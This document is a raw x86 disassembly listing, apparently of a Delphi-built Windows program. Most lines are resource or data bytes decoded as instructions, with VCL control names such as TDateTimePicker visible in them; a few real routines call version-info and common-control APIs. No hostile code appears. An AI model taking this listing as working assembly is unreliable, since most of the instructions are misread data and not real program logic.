add [ ecx + edi ] dl
inc eax
add [ eax ] bl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc esp
sub al [ edi ]
or al 0x0
jo r-xdata
push ebx
je r-xdata
rol [ ebx ] 0x1
insb
iretd
dec edi
outsb
dec ebx
jns r-xdata
je r-xdata
add [ eax + 0x4f070032 ] al
add [ eax ] al
dec edi
jbe r-xdata
inc ebp
outsb
inc esp
jb r-xdata
cwde
push eax
outsd
jo r-xdata
add [ ecx ] al
add [ eax ] al
add ah cl
sub al [ edi ]
pop es
inc esp
popad
je r-xdata
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] eax
add [ eax ] al
push esp
sub al [ edi ]
pop es
inc esp
jb r-xdata
insd
inc ebx
outsd
insd
bound ebp [ edi + 0x42 ]
outsd
js r-xdata
push esp
imul ebp [ ebp + 0x65 ] 0x6f727245
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b0038 ] al
outsb
push ebx
je r-xdata
rol [ ebx ] cl
add [ ecx ] al
add bh bh
add [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
cmp [ eax ] al
or ecx [ edi + 0x6e ]
adc [ ecx ] al
add bh bh
adc [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
outsb
inc ebp
outsb
je r-xdata
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
xor al [ eax ]
pop es
dec edi
pop ds
inc edi
add [ eax + 0x2 ] cl
add bh bh
dec eax
add al [ eax ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0e0034 ] al
outsb
jb r-xdata
inc ebp
outsb
inc esp
outsd
arpl [ ebx - 0x68 ] bp
rol [ ebx ] 0x1
sbb [ ecx ] al
add bh bh
sbb [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
xor [ eax ] eax
or [ edi + 0x6e ] ecx
add [ eax ] eax
dec [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f090030 ] al
outsb
jo r-xdata
outsb
push es
push ebx
je r-xdata
insb
add [ eax ] al
pop es
je r-xdata
add ecx [ 0x74614454 ]
push esp
inc esp
sub al [ edi ]
add [ eax ] al
add [ eax ] al
or [ ebx + 0x6f ] al
insd
push ebp
jo r-xdata
add [ eax - 0x80000000 ] al
cmp [ eax ] eax
or ecx [ edi + 0x6e ]
pop eax
sub al [ edi ]
cmp [ eax ] eax
sbb al 0x39
inc eax
add [ eax ] dl
cmp [ eax ] eax
pop eax
inc eax
add [ esi + esi + 0x40 ] dh
add [ eax + 0xe004036 ] dh
jb r-xdata
sub [ ecx ] al
rol [ ebx ] 0x1
or [ ecx ] al
add bh bh
or [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
xor [ eax ] al
or [ edi + 0x6e ] ecx
add [ eax + 0x4f0a002f ] al
outsb
inc esp
jb r-xdata
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
xor al 0x41
add [ eax ] ch
add [ eax ] eax
[ eax ]
pop eax
imul ebp [ esi + 0x67 ] 0x61440b01
je r-xdata
inc ebx
popad
insb
inc ecx
insb
imul esp [ edi + 0x6e ] 0x746e656d
add [ eax ] eax
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ ebx + ebp ] al
inc edi
add [ edi ] al
je r-xdata
sub eax [ edi ]
add ecx [ edi ]
push esp
inc esp
push esp
push bx
push 0x674726f
dec sp
outsd
outsb
or [ bp + di + 0x6f ] al
add [ edi ] al
push esp
imul ebp [ ebp + 0x65 ] 0x6d6f4308
inc ebx
je r-xdata
inc ebx
je r-xdata
insb
jae r-xdata
jae r-xdata
outsd
ja r-xdata
inc ebp
inc esp
popad
je r-xdata
inc eax
add [ esi ] cl
inc esp
outsd
arpl [ ebx + 0x58 ] bp
add [ eax ] al
add [ eax ] al
or [ edi ] 0x0
add [ eax ] al
push esp
imul ebp [ ebp + 0x65 ] 0x6b636950
jb r-xdata
add [ esi + esi + 0x40 ] dh
add ah dl
cwde
pushad
inc esp
add [ eax + 0x36 ] bl
inc eax
inc ecx
outsb
je r-xdata
push esp
inc esp
popad
dec esp
je r-xdata
insd
inc ebx
je r-xdata
outsd
insb
jae r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
fsubr [ edi + eax * 2 ]
insb
jae r-xdata
popad
je r-xdata
shr [ edx ] 0x1
inc edi
add [ ebx ] al
or eax 0x44544454
popad
je r-xdata
je r-xdata
add [ eax ] al
add [ edi ] cl
add [ ecx ] cl
insb
inc ebp
jae r-xdata
pop eax
and [ edi ] eax
inc ebx
add [ eax ] cl
inc ebx
outsd
sub eax 0xf070047
push esp
inc esp
popad
je r-xdata
and eax 0x8f9c0048
inc esp
add [ eax + 0x58 ] ah
inc esp
add [ edx + ebp * 2 + 0x3e3c0041 ] al
inc esp
add [ edx + edx ] dh
inc esp
add [ ebp + eax * 2 + 0x44 ] bl
add [ ebx + ebx + 0x44 ] cl
add [ ecx + ebp * 8 ] ch
inc ecx
add [ esi ] dl
inc ecx
add [ esi ] cl
inc ecx
add [ ecx + ebp * 8 ] dh
inc ecx
add al ah
xor cl [ eax ]
mov al 0x8a
inc esp
add ah cl
pop [ eax + eax + 0x18 ]
pop [ eax + eax - 0x58 ]
adc [ eax + eax + 0x2c ] al
test [ eax + eax + 0x4c ] eax
test [ eax + eax - 0x5c ] eax
add [ eax + eax - 0x10 ] 0xf
inc esp
add ah dh
cmove eax [ eax ]
or al 0x40
inc esp
add [ eax ] bh
inc eax
inc esp
add [ ebx + ebx ] dh
inc esp
add [ ecx + edx + 0x44 ] ch
add al al
sbb al 0x44
add [ eax ] bh
sbb al 0x44
add [ edi + ebx + 0x44 ] cl
add al bh
sbb eax 0x5f340044
inc esp
add [ eax + eax * 2 - 0x7d07ffbc ] bh
inc esp
add [ ebx + eax * 4 + 0x44 ] dh
add [ eax + 0x5800447e ] dh
add [ eax + eax - 0x2c ] 0x45
inc esp
add [ esp + ecx * 2 + 0x44 ] dl
add al al
pop ecx
inc esp
add [ esp + esi + 0x48 ] bl
add [ esi + edx * 2 + 0x35280044 ] ah
dec eax
add [ eax + 0x5a ] bl
inc esp
add [ edx + ebx * 2 + 0x44 ] bl
add [ ecx + ebx * 2 ] dl
inc esp
add [ eax + ebx * 2 - 0x7b67ffbc ] bh
inc esp
add [ ebx ] al
inc esp
add [ ecx + eax * 4 + 0x44 ] dl
add [ esp + eax * 4 ] al
inc esp
add [ esp + esi ] ch
dec eax
add [ eax ] cl
dec eax
add ah dl
aaa
dec eax
add [ eax + 0x4004827 ] bh
cmp [ eax ] cl
cmp [ eax ] bh
dec eax
add ah ah
cmp [ eax ] cl
push cs
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax + edx + 0x2900040 ] ch
add [ eax ] al
add al 0x0
or eax 0x4eb00eb0
mov esp 0x3570ffb3
dec eax
add [ eax - 0x4bffb7cb ] dl
xor eax 0x35080048
dec eax
add [ edi ] cl
push esp
inc esp
popad
je r-xdata
push esp
imul ebp [ ebp + 0x65 ] 0x6c410b01
or [ ebx + 0x6f ] al
je r-xdata
add [ eax + eax ] cl
inc eax
add [ edx + ebp + 0xb030047 ] dl
push esp
inc esp
push esp
inc esp
popad
je r-xdata
push esp
imul ebp [ ebp + 0x65 ] 0x61445409
sub eax [ edi ]
or [ edx ] dl
push esp
inc esp
push esp
push eax
insd
inc ebx
je r-xdata
outsd
imul ebp [ ebp + 0x65 ] 0x646e694b
add [ eax ] eax
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ edx + ebp + 0x47 ] dl
add [ edi ] al
push esp
inc esi
outsd
jb r-xdata
insb
add [ gs : ebx ] ecx
inc ecx
insb
insd
push edx
imul esp [ edi + 0x68 ] 0x6f430874
adc al [ eax ]
or al 0x43
insb
dec ebx
imul ebp [ esi + 0x64 ] r-xdata
push 0x2cff0001
xchg edx eax
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax + 0x1 ] ch
add bh bh
sub al 0x92
fiadd [ ebx ]
arpl [ ecx ] ax
add bh bh
cwde
xchg ecx eax
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ 0x65420a00 ] cl
jbe r-xdata
inc ebx
add [ ecx + eax ] ah
insb
jae r-xdata
jae r-xdata
push esp
imul ebp [ ebp + 0x65 ] 0x6b636950
jb r-xdata
inc eax
add [ eax - 0x1e ] ch
inc ecx
add [ ecx + edi ] bl
inc eax
add [ eax + 0x58004460 ] bl
push 0x65676e61
pop es
inc edx
outsd
outsd
insb
popad
outsb
lea eax [ eax ]
clc
sub eax [ edi ]
dec ebp
outsd
add [ gs : eax ] eax
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax + 0xa00472a ] dl
add [ eax ] al
add [ eax ] al
dec ecx
outsb
jo r-xdata
popad
jb r-xdata
popad
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x54040017 ] al
imul ebp [ ebp + 0x65 ] r-xdata
imul eax [ edx ] 0x39f4ff00
dec eax
add [ ecx ] al
add [ eax ] al
mov esp 0x740043cd
add [ eax ] al
call [ edx + eax * 2 + 0x44 ]
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x430b0014 ] al
outsd
outsb
jae r-xdata
insb
inc ebx
outsd
insb
outsd
jb r-xdata
add [ eax ] al
adc [ ebx ] 0x0
or [ ebx + 0x61 ] eax
popad
insb
inc ecx
insb
imul esp [ edi + 0x6e ] 0x746e656d
and al 0x1e
inc edi
add [ eax ] cl
add al [ eax ]
[ eax + 0x28 ]
dec eax
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x43090013 ] al
popad
insb
push edi
imul esp [ esp + esi * 2 + 0x68 ] r-xdata
pop edi
add [ eax ] al
push [ eax ]
add [ eax ] al
adc [ eax ] al
or al [ edx + 0x65 ]
jbe r-xdata
insb
dec ecx
outsb
outsb
jb r-xdata
add [ eax + 0x42080011 ] al
imul eax [ ecx + ebp * 2 + 0x4d ] 0x465646f
sub eax [ edi ]
push eax
add al [ eax ]
[ ecx + edi ]
insb
dec edi
jne r-xdata
or al [ edx + 0x65 ]
jbe r-xdata
add [ eax ] al
add [ eax + eax ] cl
add [ ecx * 8 + 0x610043 ] dl
add bh bh
mov eax 0x54004410
adc [ eax + eax ] eax
add [ eax ] al
add [ ebx ] 0x0
add [ eax ] al
or eax [ eax ]
pop es
inc ecx
outsb
arpl [ eax + 0x6f ] bp
jb r-xdata
insd
inc ebx
je r-xdata
push eax
imul esp [ ebx + 0x6b ] 0x2bf87265
inc edi
add [ eax + 0x21 ] bl
inc edi
add [ ebx ] al
or [ ebx + 0x6f ] al
sub eax [ edi ]
add dl ch
sub al 0x47
add [ ebp + 0x2940047 ] al
add [ eax ] al
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] eax
add [ eax ] al
int3
adc [ eax ] al
push edx
add al [ eax ]
inc [ ecx + edi + 0x48 ]
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
sbb [ eax ] al
or al 0x53
push 0x6843776f
arpl [ gs : ebx + 0x62 ] bp
jb r-xdata
add [ edi ] bl
add bh bh
jo r-xdata
[ eax + 0x1004491 ]
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ esi ] cl
add [ edx ] cl
inc edx
jbe r-xdata
fiadd [ ebx ]
add [ fs : eax ] eax
dec eax
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x430c0012 ] al
add bh bh
sbb al 0x39
jb r-xdata
inc edx
jbe r-xdata
add [ gs : eax ] eax
dec [ edx + edx * 4 ]
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
str [ ecx ]
or al 0x0
cld
fiadd [ ebx ]
bound eax [ ecx ]
add bh bh
fcom [ ecx + 0x10044 ]
add [ eax ] al
add [ eax ] al
add [ eax + 0xf ] al
outsd
ja r-xdata
jbe r-xdata
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
sbb [ eax ] eax
pop es
inc ebx
push 0x656b6365
inc esp
clc
inc ecx
add [ eax ] dh
add bh bh
add al 0x1f
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ 0x1a800000 ] 0x0
add eax 0x6f6c6f43
jb r-xdata
sub al [ edi ]
push ebx
add al [ eax ]
call [ ecx + edi + 0x10048 ]
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
sbb eax [ eax ]
or al [ ecx + 0x74 ]
inc esi
outsd
jb r-xdata
insd
add [ gs : eax ] dl
inc eax
add [ ecx + 0x2 ] ch
add bh bh
hlt
imul ebp [ esi + 0x74 ] 0x43ccb473
add [ eax + ebp ] bh
dec eax
add [ eax + ebp + 0x48 ] ch
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x44040015 ] al
popad
je r-xdata
add dh bh
mov [ esi ] bl
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
fild [ ebx ]
add [ eax ] bl
sub eax 0x47
outsb
je r-xdata
sbb al 0xcc
inc ebx
add [ ebp ] bl
add bh bh
pushad
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
pop ds
add [ eax ] cl
inc esp
jb r-xdata
popad
je r-xdata
outsd
js r-xdata
lodsb [ esi ]
adc [ eax ] al
nop
add al [ eax ]
jmp [ eax + 0x100483a ]
add al 0x8
push es
push ebx
outsb
jb r-xdata
dec ecx
insd
dec ebp
outsd
inc esp
fiadd [ ebx ]
mov [ ecx ] al
add bh bh
mov [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
and eax [ eax ]
pop es
dec ecx
insd
dec esi
popad
insd
push esp
sub al [ edi ]
push esi
add al [ eax ]
dec ebp
outsd
add [ gs : eax ] dl
inc eax
add [ eax ] dl
add dh bh
add [ fs : eax ] al
inc ebx
push 0x626b6365
sub al [ edi ]
push esp
add al [ eax ]
[ eax + 0x1004839 ]
add cl [ edx ]
push ebp
jae r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ edx + eax + 0xa ] si
sbb al 0x20
inc edi
add [ ecx + ebp * 8 ] dl
inc ecx
add [ ecx + edi ] dl
inc eax
jb r-xdata
add [ eax ] al
add [ eax ] al
0x400472c 0x472d
je r-xdata
cmp [ eax ] eax
imul ebp [ esi + 0x67 ] 0x72745306
sub_472509
pushfd
cmp eax 0x44
add [ eax + 0x1 ] al
pop ss
add [ edi ] al
inc ebp
outsb
popad
bound ebp [ ebp + 0x64 ]
mov ah 0xcc
inc ebx
add [ eax ] bl
add al [ eax ]
[ ecx + ebp + 0x27fc0048 ]
sub_47353c
or [ ecx ] bh
inc eax
add [ ecx + edi ] dl
inc eax
add [ eax ] bl
cmp [ eax ] eax
sbb al 0x39
inc eax
add [ eax ] dl
cmp [ eax ] eax
pop eax
inc eax
add [ esi + esi + 0x40 ] dh
add [ esi + ebp * 2 ] dl
inc ecx
add [ eax + 0x6b ] ch
inc ecx
add [ eax + 0x6b ] dh
inc ecx
add al ch
cmp cl [ eax ]
cwde
fadd [ esi ]
pushad
outsd
inc ecx
add al dl
cmp ecx [ eax ]
cmp [ ebx ] 0x48
add [ eax + ebx * 8 + 0x46 ] bl
add [ eax ] bl
cmp ecx [ eax ]
dec esp
cmp ecx [ eax ]
mov al [ 0xffffffffec00483b ]
cmp ecx [ eax ]
or [ eax + ecx * 2 ] bh
add [ esp + edx * 2 ] cl
inc ebx
outsd
insd
bound ebp [ edi + 0x45 ]
js r-xdata
outsb
outsb
je r-xdata
je r-xdata
inc edi
0x200044 0xff00
add [ ecx ] dl
dec edi
jbe r-xdata
insd
lea eax [ eax ]
movsb [ edi ] [ esi ]
xor eax 0xc070047
push esp
inc ebx
outsd
insd
bound ebp [ edi + 0x45 ]
js r-xdata
insd
add [ esi * 2 + 0x3cc00041 ] al
dec eax
add [ esp + esi * 2 + 0x74c00041 ] bh
inc ecx
add ah bh
jo r-xdata
add [ eax + 0x80046cc ] bh
cmp [ eax ] eax
jb r-xdata
add [ eax ] al
add [ eax - 0x1 ] al
add eax [ eax ]
adc [ edi + 0x76 ] ecx
jb r-xdata
je r-xdata
adc al 0x39
inc eax
add [ eax ] bl
cmp [ eax ] eax
sbb al 0x39
inc eax
add [ eax ] dl
cmp [ eax ] eax
pop eax
inc eax
add [ esi + esi + 0x40 ] dh
add [ eax + esi * 2 ] cl
inc ecx
add [ eax + 0x6b ] ch
inc ecx
add [ eax + 0x6b ] dh
inc ecx
add [ eax + esi * 2 + 0x41 ] ah
inc edi
add [ ebp + ecx * 8 + 0x46 ] al
add [ ebx ] al
add [ eax ] cl
inc ebx
outsd
insd
inc ebx
je r-xdata
insb
jae r-xdata
add [ eax + 0x71 ] bh
inc ecx
add [ ecx + ebx * 8 + 0x46 ] ah
add [ eax ] dh
cmp eax 0x540d0048
inc ebx
outsd
insd
bound ebp [ edi + 0x45 ]
js r-xdata
popad
jns r-xdata
inc esp
add [ eax + eax ] bl
add bh bh
xor [ eax ] al
add dh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x1 ] al
add al 0x0
adc dl [ ebx + 0x65 ]
insb
arpl [ gs : ebp + 0x64 ] si
dec ecx
insd
pop esp
xor eax 0xcb8c0047
inc esi
add [ 0x6f430800 ] al
insd
inc ebx
je r-xdata
dec eax
add [ ecx + ecx * 2 + 0x48 ] ch
add [ eax + 0x38004180 ] dh
add [ ecx ] sub_484980
add [ edx + 0x45dc0041 ] 0x48
add [ eax ] al
inc esi
dec eax
add ah ch
jne r-xdata
add [ edi + esi + 0x47 ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah ah
aaa
inc edi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah cl
aaa
inc edi
add [ eax ] bl
add [ eax ] al
add [ eax ] ch
0x39080042 0x40
je r-xdata
aam 0x36
inc edi
insd
popad
dec ecx
outsb
js r-xdata
and al 0x0
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x1 ] al
add al [ eax ]
push es
dec ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al al
inc eax
add [ eax + 0x4736 ] dl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah dl
inc edi
insd
popad
dec ecx
outsb
js r-xdata
dec ecx
insb
jae r-xdata
enter 0x4849 0x0
adc dl [ ebx + eax * 2 + 0x6f ]
add [ eax ] dh
inc esi
dec eax
add [ edi + eax * 2 ] ah
dec eax
add [ eax ] dh
inc edi
dec eax
add [ edx + edi * 2 ] dh
inc ecx
add al dl
dec eax
dec eax
add [ ecx + ecx * 2 ] bl
dec eax
add [ edi * 2 + 0x49240041 ] al
cmp [ eax ] eax
adc [ ecx ] bh
inc eax
add [ eax + 0x36 ] bl
inc eax
insd
jae r-xdata
imul eax [ ecx ] 0x70
imul eax [ ecx ] 0x64
jo r-xdata
0x1c0044 0xff00
inc eax
add [ eax + eax ] ah
add bh bh
add [ eax + edx + 0x40 ] dl
add [ eax ] al
add [ eax ] al
lodsb [ esi ]
cmp [ edi ] eax
add [ eax ] al
js r-xdata
inc edx
add [ eax + 0x7d ] ch
inc ecx
add [ ebp + edi * 2 + 0x49380041 ] bh
dec eax
add ah bh
jg r-xdata
dec eax
add [ eax ] bh
jge r-xdata
and al 0x49
add [ eax + 0x49 ] bl
add [ eax ] ch
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
shl [ esi ] 0x47
rcl ah 0x36
inc edi
add [ edi ] al
or eax 0x6d6f4354
bound ebp [ edi + 0x45 ]
js r-xdata
inc ebp
add [ eax ] al
jne r-xdata
sbb al 0x39
je r-xdata
push 0x94004739
cmp [ edi ] eax
cwde
je r-xdata
add al [ eax ]
add [ eax - 0x15 ] al
inc edx
add [ ecx + ebp * 8 ] dl
inc ecx
add [ ecx + edi ] dl
inc eax
add [ eax - 0x1e ] ch
inc ecx
js r-xdata
or al 0xeb
insd
bound ebp [ edi + 0x42 ]
outsd
js r-xdata
add [ eax + eax * 4 + 0x41 ] dl
add al ch
add [ ecx ] 0xc0
dec ecx
dec eax
add al cl
dec ecx
dec eax
add [ edx ] dl
push esp
inc ebx
outsd
add [ esi + esi + 0x40 ] dh
add ah dh
inc esi
dec eax
add [ eax + 0x6b ] ch
adc al 0x39
inc eax
add [ eax ] bl
cmp [ eax ] eax
sbb al 0x39
inc eax
add [ eax ] dl
cmp [ eax ] eax
pop eax
inc eax
je r-xdata
inc eax
add [ eax ] dl
cmp [ eax ] eax
pop eax
inc eax
add [ esi + esi + 0x40 ] dh
add [ eax ] al
0x42600041 0x44
inc eax
add [ ecx + edi ] bl
insd
inc ebx
outsd
insd
bound ebp [ edi + 0x42 ]
outsd
js r-xdata
add [ esi + esi + 0x40 ] dh
add ah al
dec eax
add [ edi + ecx * 4 + 0x58600044 ] bl
inc esp
add [ edx + ebp * 2 + 0x37040041 ] al
pushad
inc esp
add [ eax + 0x36 ] bl
inc eax
outsd
js r-xdata
imul ebp [ esi + 0x67 ] 0x37e49073
inc edi
add [ edi ] al
adc dl [ ebx + eax * 2 + 0x6f ]
insd
bound ebp [ edi + 0x42 ]
loop r-xdata
je r-xdata
add [ esi ] dl
inc ecx
add [ esi ] cl
inc ecx
add [ ecx + ebp * 8 ] dh
inc ecx
add [ esi + edi ] dl
insb
jae r-xdata
inc ecx
add [ edi + esi * 2 + 0x76a40041 ] ah
inc ecx
add [ eax + ecx * 2 + 0x48 ] bh
add [ eax - 0x53ffb7b8 ] ah
dec eax
dec eax
add [ eax - 0x77ffb7b8 ] bh
jpe r-xdata
jae r-xdata
insd
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov eax 0x2800473a
add [ eax ] al
add al dl
salc
inc esi
add [ eax ] cl
cmp [ eax ] eax
adc al 0x39
js r-xdata
dec eax
add [ eax - 0x33ffbb76 ] dh
pop [ eax + eax + 0x18 ]
pop [ eax + eax - 0x58 ]
adc [ eax + eax + 0x2c ] al
test [ eax + eax + 0x4c ] eax
test [ eax + eax - 0x5c ] eax
add [ eax + eax - 0x10 ] 0xf
inc esp
add ah dh
cmove eax [ eax ]
or al 0x40
inc esp
add [ eax ] bh
inc eax
inc esp
add [ ebx + ebx ] dh
inc esp
add [ ecx + edx + 0x44 ] ch
add al al
sbb al 0x44
add [ eax ] bh
sbb al 0x44
add [ edi + ebx + 0x44 ] cl
add al bh
sbb eax 0x40b40044
dec eax
add [ eax + eax * 2 - 0x7d07ffbc ] bh
inc esp
add [ ebx + eax * 4 + 0x44 ] dh
add [ eax + 0x5800447e ] dh
add [ eax + eax - 0x2c ] 0x45
inc esp
add [ esp + ecx * 2 + 0x44 ] dl
add al al
pop ecx
inc esp
add [ edi + edi + 0x48 ] bh
add [ esi + edx * 2 + 0x424c0044 ] ah
dec eax
add [ eax + 0x5a ] bl
inc esp
add [ edx + ebx * 2 + 0x44 ] bl
add [ esi + ebp + 0x43 ] ch
add [ eax + 0x45 ] dl
dec eax
add [ eax + 0x4004484 ] bl
arpl [ eax + eax + 0x54 ] ax
add [ eax + eax + 0x4 ] 0x88004484
cmp [ ebx ] eax
sbb al 0x2f
inc ebx
add [ eax + 0x2f ] cl
inc ebx
add [ ecx + edi + 0x2e400043 ] bl
adc al 0x3e
add [ ecx + edi ] bl
inc eax
add [ eax + 0x58004460 ] bl
inc eax
inc ebx
add ah bh
inc eax
dec eax
add [ ebp + eax * 2 + 0x44 ] bl
add [ ebx + ebx + 0x44 ] cl
add [ ecx + ebp * 8 ] ch
inc ecx
inc ecx
add [ edi + esi ] al
inc edx
add [ eax ] al
add [ eax ] cl
inc ebx
outsd
insd
inc ebx
je r-xdata
imul ebp [ esi + 0x67 ] 0x47374473
add [ ebx + ebp * 8 ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebp + 0x385c0040 ] cl
inc edi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx + edi + 0x47 ] ch
inc ebx
add ah al
cmp [ ebx ] al
sar [ eax ] 0x1
inc ebx
add [ ecx + edi + 0x43 ] bl
add ah bh
rol [ eax + eax - 0x70 ] cl
inc ebx
add ah ah
aaa
inc ebx
add [ eax + 0x31 ] ch
inc ebx
add [ eax + 0x48004844 ] bl
inc ebp
dec eax
add [ edi + ebp + 0x448c0043 ] al
dec eax
add [ eax * 2 + 0x38a00048 ] cl
inc ebx
add [ edi ] al
add bh ch
dec [ 0x4eb009b0 ]
mov esp 0x201ffd9
mov ch 0xff
test al 0x44
dec eax
add [ ecx + eax * 2 + 0x48 ] dl
add [ ecx + eax * 2 ] ch
dec eax
add [ edi + edi ] ch
dec eax
add [ eax - 0x4bffb7bc ] ah
inc ecx
dec eax
add [ eax + 0x11004845 ] ah
push esp
inc ebx
jne r-xdata
shr [ ecx + edi + 0x11070047 ] 0x54
inc ebx
jne r-xdata
0xcc80041 0x44
je r-xdata
add [ edx + ebp * 8 ] dh
inc ecx
add al cl
or al 0x44
add [ eax ] ch
jecxz r-xdata
insd
inc ebx
outsd
insd
bound ebp [ edi + 0x42 ]
outsd
js r-xdata
or eax 0xe1f00044
inc esp
add [ edx + eax * 2 + 0xe040044 ] cl
inc esp
add [ esi + ecx + 0x44 ] al
add [ eax ] dh
or eax 0xe2040044
inc esp
add [ eax ] cl
loop r-xdata
add [ ebp + ecx + 0x44 ] dh
add [ eax + 0x4c0041e9 ] bh
0xeac00041 0x41
inc eax
add [ eax ] bl
cmp [ eax ] eax
add [ ecx + edi ] dl
js r-xdata
add [ edx + 0x74 ] dh
add bh bh
add [ ebp + ecx + 0x44 ] dl
add ah al
or al [ eax + eax - 0x18 ]
loop r-xdata
add dl ch
inc ecx
add [ eax + 0x42 ] ah
inc esp
cmp [ edi ] al
clc
in al dx
inc edx
add [ ebx ] cl
add [ eax ] cl
inc ebx
outsd
insd
inc ebx
je r-xdata
js r-xdata
add [ ebx + 0x46 ] ch
add ah bh
loop r-xdata
inc esp
add [ ecx ] ch
inc esp
add [ eax ] ch
or al 0x44
add [ ecx + 0x44 ] dl
add [ edx + eax * 2 + 0xda00044 ] al
inc esp
add [ esp + ecx + 0x44 ] bl
add [ ecx - 0x1e47ffbc ] ah
inc esp
add [ esp + ecx - 0x1e1fffbc ] dl
inc esp
add al dh
or al 0x44
add al ch
loope r-xdata
insb
jae r-xdata
dec eax
add [ eax ] al
jne r-xdata
add [ ebx - 0x7d ] dl
add al 0x24
or [ eax ] al
add al bl
jecxz r-xdata
add [ 0x6d6f4354 ] dl
bound ebp [ edi + 0x42 ]
outsd
js r-xdata
add [ eax ] dl
add [ eax ] ah
cmp al [ edi ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov ebx [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_473c1b
lea eax [ ebp - 0x4 ]
call sub_40442c
retn
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_4044c4
lea eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_4048dc
mov esi eax
push esi
call GetFileVersionInfoSizeA
mov ebx eax
test ebx ebx
je r-xdata
mov eax ebx
pop ecx
pop edx
pop ebx
retn
call InitCommonControls
add [ eax ] al
mov [ esp + 0x4 ] eax
mov eax esp
call sub_428edc
cmp eax 0x1
sbb ebx ebx
inc ebx
test bl bl
add [ eax - 0x1b ] ah
inc esi
add ah ah
dec ebx
dec eax
add [ ebx + ecx * 2 + 0x48 ] dh
js r-xdata
mov eax ebx
call sub_402744
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_473bf1
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
push eax
push ebx
mov eax [ ebp - 0x8 ]
push eax
push esi
call GetFileVersionInfoA
test eax eax
je r-xdata
jne r-xdata
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
dec esp
imul ebp [ esi + 0x6b ] 0xffffc08b
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
call sub_402764
retn
lea eax [ ebp - 0x14 ]
push eax
